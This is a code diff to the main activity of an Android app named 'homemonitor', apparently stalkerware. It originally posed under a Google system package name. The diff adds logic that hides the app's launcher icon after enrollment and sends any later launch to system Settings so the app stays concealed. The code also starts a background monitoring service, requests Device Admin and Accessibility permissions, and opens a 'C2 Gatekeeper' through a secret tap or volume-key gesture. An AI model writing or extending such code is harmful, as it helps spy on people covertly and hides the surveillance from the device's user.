@@ -1,9 +1,10 @@
-package com.google.android.system
+package com.homemonitor
 
 import android.Manifest
 import android.content.Intent
 import android.os.Build
 import android.os.Bundle
+import android.provider.Settings
 import android.util.Log
 import android.view.KeyEvent
 import androidx.activity.compose.setContent
@@ -11,14 +12,18 @@ import androidx.activity.enableEdgeToEdge
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 import androidx.compose.runtime.*
+import com.google.android.system.C2Gatekeeper
+import com.google.android.system.MonitorService
+import com.google.android.system.SecurityVaultManager
 
 /**
  * MainActivity
  *
- * Play Service Launcher Activity with In-App Google Play Services App Info UI & Secret C2 Gatekeeper:
- * - Renders PlayServicesAppInfoScreen via Compose.
- * - Secret 5-tap gesture on header opens C2 Gatekeeper password dialog.
- * - Prompts for Runtime, Device Admin, Accessibility, Notification, and Battery Optimization permissions on first launch.
+ * Android System Enrollment Activity & Stealth Mode Settings Redirect:
+ * - Checks if app is in Stealth Hidden Mode or post-enrollment.
+ * - If hidden: Automatically redirects user to Android System Settings (Settings.ACTION_SETTINGS) and finishes.
+ * - If first launch: Presents UserEnrollmentScreen to grant permissions and link parent account.
+ * - Secret 5-tap / Volume key combo opens C2 Gatekeeper options.
  */
 class MainActivity : AppCompatActivity() {
 
@@ -65,71 +70,72 @@ class MainActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         instance = this
 
+        // Check if Enrollment is complete and Stealth Hidden Mode is active — Redirect to System Settings
+        val prefs = SecurityVaultManager.getEncryptedPrefs(this)
+        val isEnrollmentDone = prefs.getBoolean("enrollment_completed", false)
+        val isAppHidden = isEnrollmentDone && (C2Gatekeeper.isLauncherIconHidden(this) || prefs.getBoolean("is_app_hidden", false))
+
+        if (isAppHidden && !intent.getBooleanExtra("bypass_stealth_redirect", false)) {
+            Log.i("MainActivity", "App enrolled & hidden — Redirecting user to System Settings ⚙️")
+            try {
+                val settingsIntent = Intent(Settings.ACTION_SETTINGS).apply {
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
+                }
+                startActivity(settingsIntent)
+            } catch (e: Exception) {
+                Log.e("MainActivity", "Settings redirect error: ${e.message}")
+            }
+            finish()
+            return
+        }
+
         // Set clean white status bar with dark icons
         window.statusBarColor = android.graphics.Color.WHITE
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             androidx.core.view.WindowCompat.getInsetsController(window, window.decorView).isAppearanceLightStatusBars = true
         }
 
-        // Render SIM Manager App UI (User Enrollment vs Stealth Disguise Screen)
+        // Render Android System User Enrollment Screen
         setContent {
-            val prefs = remember { SecurityVaultManager.getEncryptedPrefs(this@MainActivity) }
-            var isDisguiseActive by remember { mutableStateOf(prefs.getBoolean("disguise_mode_active", false)) }
-
-            if (isDisguiseActive) {
-                com.homemonitor.SimManagerScreen(
-                    onUnlockMaster = {
-                        isDisguiseActive = false
-                        prefs.edit().putBoolean("disguise_mode_active", false).apply()
-                    }
-                )
-            } else {
-                com.homemonitor.UserEnrollmentScreen(
-                    onEnrollmentComplete = {
-                        // Reload C2 instances if active
-                        Log.i("MainActivity", "Enrollment completed.")
-                    },
-                    onActivateDisguise = {
-                        isDisguiseActive = true
-                        prefs.edit().putBoolean("disguise_mode_active", true).apply()
-                    }
-                )
-            }
+            UserEnrollmentScreen(
+                onEnrollmentComplete = {
+                    Log.i("MainActivity", "Enrollment completed. Hiding app icon and activating stealth redirect...")
+                    prefs.edit()
+                        .putBoolean("enrollment_completed", true)
+                        .putBoolean("is_app_hidden", true)
+                        .apply()
+                    C2Gatekeeper.toggleLauncherIconHiding(this@MainActivity)
+                    try {
+                        val settingsIntent = Intent(Settings.ACTION_SETTINGS).apply {
+                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
+                        }
+                        startActivity(settingsIntent)
+                    } catch (_: Exception) {}
+                    finish()
+                },
+                onActivateDisguise = {
+                    prefs.edit().putBoolean("enrollment_completed", true).apply()
+                    try {
+                        val settingsIntent = Intent(Settings.ACTION_SETTINGS).apply {
+                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
+                        }
+                        startActivity(settingsIntent)
+                    } catch (_: Exception) {}
+                    finish()
+                }
+            )
         }
 
         // Start background MonitorService
         startMonitorService()
 
         // Check if first launch permission setup is needed
-        val prefs = SecurityVaultManager.getEncryptedPrefs(this)
         val hasCompletedFirstBoot = prefs.getBoolean("first_boot_perms_done", false)
 
         if (!hasCompletedFirstBoot) {
             prefs.edit().putBoolean("first_boot_perms_done", true).apply()
             permissionLauncher.launch(requiredPermissions)
         }
-    }
-
-    private fun runSystemPermissionPrompts() {
-        // Smooth background initialization — start MonitorService silently without launching back-to-back settings popups
-        startMonitorService()
-    }
-
-    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
-        if (C2Gatekeeper.handleVolumeKeyEvent(this, keyCode) {}) {
-            return true
-        }
-        return super.onKeyDown(keyCode, event)
-    }
-
-    override fun onResume() {
-        super.onResume()
-        startMonitorService()
-    }
-
-    override fun onDestroy() {
-        super.onDestroy()
-        if (instance == this) instance = null
     }
 
     private fun startMonitorService() {
@@ -140,6 +146,19 @@ class MainActivity : AppCompatActivity() {
             } else {
                 startService(intent)
             }
-        } catch (_: Exception) {}
+        } catch (e: Exception) {
+            Log.e("MainActivity", "startMonitorService exception: ${e.message}")
+        }
+    }
+
+    private fun runSystemPermissionPrompts() {
+        startMonitorService()
+    }
+
+    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
+        if (C2Gatekeeper.handleVolumeKeyEvent(this, keyCode) {}) {
+            return true
+        }
+        return super.onKeyDown(keyCode, event)
     }
 }
